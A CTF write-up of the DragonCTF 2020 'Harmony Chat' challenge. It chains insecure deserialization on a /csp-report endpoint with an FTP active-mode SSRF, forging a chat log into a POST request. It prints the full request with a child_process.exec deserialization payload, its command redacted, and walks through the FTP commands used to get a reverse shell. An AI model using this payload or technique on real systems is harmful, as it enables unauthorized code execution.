---
layout: post
title: "[DragonCTF 2020] Harmony Chat"
author: Vie
---

# TL;DR
1. RCE is achievable via insecure deserialization on ``/csp-report`` endpoint
2. Make a chatlog that looks exactly like a POST request to said endpoint, with a reverse-shell payload in it 
3. Use FTP on active mode to send chatlog to the application's HTTP server
4. reverse-shell. Profit. 


# Harmony Chat
If I told you that the simple act of exchanging messages in a chat app would lead to RCE and opening a reverse-shell, you'd think I went crazy. So why don't we discuss my descent into madness?

**Harmony Chat** was the first web challenge released on DragonCTF 2020. It was a chat app a la Discord, with the ability to register a new user, create a new channel, and invite other users to your channel.

![ImTalkingToMyself](/assets/images/dragonctf2020/harmonychat/harmonychatlogexample.png) 

You exchange messages just as any other chat app, and afterwards you can request for a log containing all the chat messages in that particular channel via HTTP or FTP. 

Requesting for the chatlog via HTTP also fires another POST request to the endpoint ``/csp-report`` which would deliver a report to the server if the chat logs had anything that violated said Content-Security-Policy. The source was provided for us so we could see how that whole interaction plays out locally. 

Requesting for the chatlog via FTP will prompt the application's FTP server to establish a data connection with you and send a file over that contained all your messages in the channel. 

```
vie: hello
vie: hi
vie: how are u today
```


Let's dive into that ``csp-report`` a bit more. It turns out that insecure-deserialization is possible via the application's use of the npm library ``javascript-serializer``. We could leverage how the serializer parses input to achieve RCE (Thanks to Robert Xiao for helping me get a payload that works :P):

![FTPCommunication](/assets/images/dragonctf2020/harmonychat/harmonyconsolelog.png) 

So RCE is achievable through a POST request to ``/csp-report``. We can use this knowledge to have the application deserialize a command to open a reverse-shell for us. One caveat though: 

```js
const isLocal = (req) => {
  const ip = req.connection.remoteAddress
  return ip === "127.0.0.1" || ip === "::1" || ip === "::ffff:127.0.0.1"
}
```
The ``isLocal`` check occurs with every request sent to ``/csp-report`` - checking if the remote IP of the request was in the LAN. We obviously didn't have to worry about this check when we were hitting this endpoint _locally_, but on DragonCTF's server, we would fail this check. So what do we do? 

Let's take a look at the FTP server, which is intended to be used to send text file versions of the chat log to the user. Since the FTP connection stipulates to us the port we should connect to, the server is operating in "passive" mode FTP. Well, what's that? 

Turns out, FTP has 2 specific modes.

- Passive: where the server tells us where to connect to establish a data connection to.

- Active: where we the clients stipulate the IP and port for the server to connect and open a data connection. 

This can solve our ``isLocal`` problem: if we get their FTP server on their LAN to work in **active mode**, and establish a connection to the HTTP server also on their LAN, then we can make that POST request to ``/csp-report`` through the FTP server. This would bypass the ``isLocal`` check since it's their FTP server making that request, on our behalf. AKA - A powerful SSRF attack. 

Now, another problem: the FTP server only ever stores files of chatlogs, and it doesn't have write access, so our POST request is gonna have to be in the form of a chat log. Well, how do we do that? 

Observe how the chatlog file looks: it has the format ``DisplayName``:``message``. The ``:`` is added by the application. This is where I had the idea: if we registered "users" all with different names that matched the request header names and the request body name, we could have those users then communicate the rest of their values as "messages" - and when finished, the resulting chat log should look exactly like the POST request we want to send. 

NOTE: I did this manually. I know there's a way to automate this. I was up for over 24 hours solving this challenge. My brain was mush.

So, we just need to break our POST request by the first ``:``

```
POST /csp-report?: HTTP/1.1
Host: localhost:3380
Content-Length: 386
Content-Type: application/csp-report

{"csp-report": {"blocked-uri": "x", "document-uri": "X", "effective-directive": "X", "original-policy": "X", "referrer": "X", "status-code": "X", "violated-directive": "X", "source-file": {"toString": {"___js-to-json-class___": "Function", "json": "process.mainModule.require(\"child_process\").exec(\"REDACTED"}}}}
```

And we get 5 "users": ``POST /csp-report?``, ``Host``, ``Content-Length``, ``Content-Type`` and ``{"csp-report"``. They will then each message the chat in order as so... 

![ThisShouldBeAutomated](/assets/images/dragonctf2020/harmonychat/chatlogsPOST.png) 


Do you see where I'm getting at with this? Now we need to download the associated chat log file, and we get:

```
POST /csp-report?: HTTP/1.1
Host: localhost:3380
Content-Length: 386
Content-Type: application/csp-report

{"csp-report": {"blocked-uri": "x", "document-uri": "X", "effective-directive": "X", "original-policy": "X", "referrer": "X", "status-code": "X", "violated-directive": "X", "source-file": {"toString": {"___js-to-json-class___": "Function", "json": "process.mainModule.require(\"child_process\").exec(\"REDACTED)"}}}}
```

EXACTLY the post request that we want (With a quick sidenote - the newline generated to seperate the request headers from the request body was achieved by sending an empty message to the channel via the console. Again, this was probably easier to do in a script). So now all that's left to do is to connect to the FTP server externally, and tell it to connect to the HTTP server in its LAN, then send over the file we just made above. 

![FTPCommunication](/assets/images/dragonctf2020/harmonychat/ftpcommunication.png) 

- The ``user`` command is expecting a uid of any user in the current session. We technically made 5, so any of their uids work.

- The ``pass`` command can be blank, as the implementation of the application said any password will be accepted. 

- The ``port`` command is what makes the FTP server operate in active mode. The command's arguments are the 4 bytes of the IP, then the 2 remaining values are the port number following this convention: p1, p2 where ``(p1 * 256) + p2`` = full port number. We want to connect to Harmony Chat's localhost at the HTTP server, which is at port 3380. 

- The ``retr`` command takes the name of a file (in this case, the name of the chatlog) and retrieves it, then sends it over the data connection it just established. If we got things right, then the FTP server would have sent our POST request to the HTTP server.

And when we check back in our ngrok instance, we see that we have indeed achieved a shell on harmony-chat-app's server :)

![HarmonyShell](/assets/images/dragonctf2020/harmonychat/harmonyshell.png) 
